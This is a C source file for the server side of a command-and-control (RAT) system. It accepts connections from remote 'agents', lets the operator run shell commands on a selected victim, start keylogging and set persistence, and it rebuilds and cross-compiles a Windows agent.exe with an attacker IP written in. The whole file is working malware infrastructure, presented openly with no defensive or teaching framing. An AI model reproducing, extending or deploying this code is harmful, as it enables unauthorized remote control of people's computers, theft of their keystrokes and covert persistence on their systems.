/**
 * @file c2.c
 */
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <pthread.h>
 #include <arpa/inet.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <sys/time.h>
 #include <netinet/in.h>
 
 /**
  * @struct Client
  * @brief Structure to store client information.
  */
 #define PORT 50004
 #define MAX_CLIENTS 10
 #define BUFFER_SIZE 1024
 #define RESPONSE_BUFFER_SIZE 18384

 #define SOURCE_AGENT_FILE "agent.c"
 #define OUTPUT_AGENT_FILE "agent.exe"
 
 typedef struct {
     int socket;                 /**< Socket descriptor of the client. */
     struct sockaddr_in address; /**< Address information of the client. */
     pthread_t thread;           /**< Thread handling the client. */
 } Client;
 
 
 Client clients[MAX_CLIENTS]; /**< Array to store connected clients. */
 pthread_mutex_t clients_mutex = PTHREAD_MUTEX_INITIALIZER; /**< Mutex for client list synchronization. */
 
 /**
  * @brief Lists all connected clients.
  * 
  * Prints the IP addresses and ports of all connected clients.
  */
 void list_clients() {
     pthread_mutex_lock(&clients_mutex);
     printf("\033[1;36m\nClients Connected:\033[0m\n");
     int found = 0;
     for (int i = 0; i < MAX_CLIENTS; i++) {
         if (clients[i].socket > 0) {
             printf("\033[1;32m[%d] %s:%d\033[0m\n", i, inet_ntoa(clients[i].address.sin_addr), ntohs(clients[i].address.sin_port));
             found = 1;
         }
     }
     if (!found) {
         printf("\033[1;33mThere are no clients connected.\033[0m\n");
     }
     pthread_mutex_unlock(&clients_mutex);
 }
 
 /**
  * @brief Adds a new client to the client list.
  * 
  * @param new_socket The socket descriptor of the new client.
  * @param client_addr The address information of the new client.
  * @return int Index of the added client in the array, or -1 if the list is full.
  */
 int add_client(int new_socket, struct sockaddr_in client_addr) {
     pthread_mutex_lock(&clients_mutex);
     for (int i = 0; i < MAX_CLIENTS; i++) {
         if (clients[i].socket == 0) {
             clients[i].socket = new_socket;
             clients[i].address = client_addr;
             pthread_mutex_unlock(&clients_mutex);
             return i;
         }
     }
     pthread_mutex_unlock(&clients_mutex);
     return -1;
 }
 
 /**
  * @brief Removes a client from the client list.
  * 
  * Closes the socket and resets the client slot.
  * 
  * @param index The index of the client to remove.
  */
 void remove_client(int index) {
     pthread_mutex_lock(&clients_mutex);
     close(clients[index].socket);
     clients[index].socket = 0;
     pthread_mutex_unlock(&clients_mutex);
 }
 
 /**
  * @brief Checks for timeout when receiving data.
  * 
  * @param bytes_received The number of bytes received.
  * @param response The response buffer containing received data.
  */
 void check_timeout(int bytes_received, char response[RESPONSE_BUFFER_SIZE]) {
     if (bytes_received > 0) {
     printf("%s", response);
     }
     else {
     printf("\033[1;33m[WARNING] No response from client (timeout).\033[0m\n");
     }
 }
 
 /**
  * @brief Handles communication with a specific client.
  * 
  * @param arg Pointer to the client index.
  */
 void* client_handler(void* arg) {
     int index = *(int*)arg;
     char buffer[BUFFER_SIZE];
     char response[RESPONSE_BUFFER_SIZE];
     while (1) {
         memset(response, 0, RESPONSE_BUFFER_SIZE);
         int bytes_received = recv(clients[index].socket, response, sizeof(response), 0);
         if (bytes_received <= 0) {
             printf("\033[1;31mClient [%d] %s:%d disconected.\033[0m\n", index, inet_ntoa(clients[index].address.sin_addr), ntohs(clients[index].address.sin_port));
             remove_client(index);
             pthread_exit(NULL);
         }
     }
 }
 
 /**
  * @brief Checks if a string is empty or contains only whitespace.
  * 
  * @param str The input string.
  * @return int 1 if empty or whitespace, 0 otherwise.
  */
 int is_empty_or_whitespace(const char *str) {
     return strspn(str, " \t\n\r") == strlen(str);
 }
 

void update_agent_file(const char *new_ip) {
    FILE *file = fopen(SOURCE_AGENT_FILE, "r");
    if (!file) {
        printf("Error: Could not open %s\n", SOURCE_AGENT_FILE);
        return;
    }

    char buffer[8192];
    fread(buffer, 1, sizeof(buffer), file);
    fclose(file);

    char new_define[256];
    snprintf(new_define, sizeof(new_define), "#define SERVER_IP \"%s\"", new_ip);
    char *old_define = strstr(buffer, "#define SERVER_IP");
    
    if (!old_define) {
        printf("Error: IP line not found in code.\n");
        return;
    }

    file = fopen(SOURCE_AGENT_FILE, "w");
    if (!file) {
        printf("Error: Could not write to %s\n", SOURCE_AGENT_FILE);
        return;
    }

    fwrite(buffer, 1, old_define - buffer, file);
    fprintf(file, "%s\n", new_define);
    fwrite(old_define + strcspn(old_define, "\n") + 1, 1, strlen(old_define), file);
    fclose(file);

    printf("IP updated on %s to %s\n", SOURCE_AGENT_FILE, new_ip);
}

void compile_agent() {
    char command[256];
    snprintf(command, sizeof(command), "i686-w64-mingw32-gcc -o %s %s -lwininet -lwsock32", OUTPUT_AGENT_FILE, SOURCE_AGENT_FILE);

    printf("Compiling the new agent...");
    int result = system(command);
    if (result == 0) {
        printf("Compilation successful: %s generated.\n", OUTPUT_AGENT_FILE);
    } else {
        printf("Compilation error.\n");
    }
}

void generate_agent_with_ip() {
    char new_ip[16];

    printf("Enter the new IP for the agent: ");
    fgets(new_ip, sizeof(new_ip), stdin);
    strtok(new_ip, "\n");

    update_agent_file(new_ip);
    compile_agent();
}

 /**
  * @brief Displays a list of available server commands.
  * 
  * This function prints a list of commands that can be used to interact with clients 
  * and manage the server.
  */
 void help_command() {
     printf("\n\033[1;36mAvailable Commands:\033[0m\n");
     printf("\033[1;32mclients\033[0m        - List all connected clients.\n");
     printf("\033[1;32mselect <index>\033[0m - Select a client to interact with.\n");
     printf("\033[1;32mdeselect\033[0m      - Deselect the currently selected client.\n");
     printf("\033[1;32mexit\033[0m          - Exit the server.\n");
     printf("\033[1;32mhelp\033[0m          - Show this help menu.\n");
     printf("\n\033[1;36mCommands for Selected Client:\033[0m\n");
     printf("\033[1;32m<command>\033[0m      - Execute a command on the selected client.\n");
     printf("\033[1;32mexit\033[0m          - Stop interacting with the client.\n");
     printf("\033[1;32mq\033[0m             - Disconnect the selected client.\n");
     printf("\033[1;32mcd <dir>\033[0m      - Change directory on the client.\n");
     printf("\033[1;32mkeylog_start\033[0m  - Start keylogging on the client.\n");
     printf("\033[1;32mpersist\033[0m       - Make the client persistent.\n");
 }
 
 /**
  * @brief Handles user input for client management.
  * 
  * This function runs in a loop, allowing the server administrator to list clients, 
  * select a client, issue commands, and manage client interactions.
  * 
  * @param arg
  * @return NULL when the function exits.
  */
 void* handle_client_input(void* arg) {
     char command[BUFFER_SIZE];
     char response[RESPONSE_BUFFER_SIZE];
     int selected_client = -1;
     while (1) {
         printf("\n>>> ");
         fgets(command, sizeof(command), stdin);
         strtok(command, "\n");
         if (strncmp(command, "clients", 7) == 0) {
             list_clients();
         }
         else if (strncmp(command, "generate", 8) == 0) {
            generate_agent_with_ip();
         }
         else if (strncmp(command, "select ", 7) == 0) {
             int index = atoi(command + 7);
             pthread_mutex_lock(&clients_mutex);
             if (index >= 0 && index < MAX_CLIENTS && clients[index].socket > 0) {
                 selected_client = index;
                 printf("\033[0;32mClient [%d] selected.\033[0m\n");
                 struct timeval timeout;
                 timeout.tv_sec = 5;
                 timeout.tv_usec = 0;
                 setsockopt(clients[selected_client].socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
                 while (1) {
                     jump:
                         bzero(&command, sizeof(command));
                         bzero(&response, sizeof(response));
                         printf("* Shell#%s\033[0;32m~$: ", inet_ntoa(clients[selected_client].address.sin_addr));
                         fgets(command, sizeof(command), stdin);
                         strtok(command, "\n");
                         
                         if (strncmp("exit", command, 4) == 0) {
                 selected_client = -1;
                             break;
                         }
                         else if (strncmp(command, "help", 4) == 0) {
                             help_command();
                         }
                         else {
                             write(clients[selected_client].socket, command, sizeof(command));                        
                         }
             
                         if (strncmp("q", command, 1) == 0) {
                             remove_client(selected_client);
                             break;
                         }
                         else if (strncmp("cd ", command, 3) == 0) {
                             goto jump;
                         }
                         else if (strncmp("keylog_start", command, 12) == 0) {
                             goto jump;
                         }
                         else if (strncmp("persist", command, 12) == 0) {
                             int bytes_received = recv(clients[selected_client].socket, response, sizeof(response), 0);
                             check_timeout(bytes_received, response);
                         }
                         else {
                             int bytes_received = recv(clients[selected_client].socket, response, sizeof(response), MSG_WAITALL);
                             check_timeout(bytes_received, response);
                         }
                 }
             } 
             else {
                 printf("Invalid index.\n");
             }
             pthread_mutex_unlock(&clients_mutex);
         }
         else if (strncmp(command, "deselect", 8) == 0) {
             if (selected_client != -1) {
                 printf("\033[0;32mClient [%d] deselected.\033[0m\n", selected_client);
                 selected_client = -1;
             }
             else {
                 printf("\033[1;33mNo client is currently selected.\033[0m\n");
             }
         }
         else if (strncmp(command, "help", 4) == 0) {
             help_command();
         }
         else if (strncmp(command, "exit", 4) == 0) {
             break;
         }
         else if (is_empty_or_whitespace(command)) {}
         else {
             printf("Command %s not found.\n", command);        
         }
     }
 }
 
 int main() {
     int server_socket, new_socket;
     struct sockaddr_in server_addr, client_addr;
     socklen_t addr_len = sizeof(client_addr);
     memset(clients, 0, sizeof(clients));
 
     server_socket = socket(AF_INET, SOCK_STREAM, 0);
     if (server_socket == -1) {
         perror("Error creating socket");
         exit(EXIT_FAILURE);
     }
 
     server_addr.sin_family = AF_INET;
     server_addr.sin_addr.s_addr = INADDR_ANY;
     server_addr.sin_port = htons(PORT);
 
     int opt = 1;
     setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
 
     if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
         perror("Error binding");
         exit(EXIT_FAILURE);
     }
 
     if (listen(server_socket, MAX_CLIENTS) < 0) {
         perror("Error listening");
         exit(EXIT_FAILURE);
     }
 
     printf("\033[0;32m* Server listening on port: %d...\033[0m\n", PORT);
 
     pthread_t input_thread;
     pthread_create(&input_thread, NULL, handle_client_input, NULL);
 
     while (1) {
         new_socket = accept(server_socket, (struct sockaddr*)&client_addr, &addr_len);
 
         if (new_socket < 0) {
             perror("Error in accept");
             continue;
         }
 
         int index = add_client(new_socket, client_addr);
 
         if (index == -1) {
             printf("Maximum number of clients reached, refusing connection.\n");
             close(new_socket);
         }
         else {
             printf("\033[0;32m\n* Client [%d] conected: %s:%d\033[0m\n", index, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
             pthread_create(&clients[index].thread, NULL, client_handler, &index);
             continue;
         }
     }
     return 0;
 }
 
 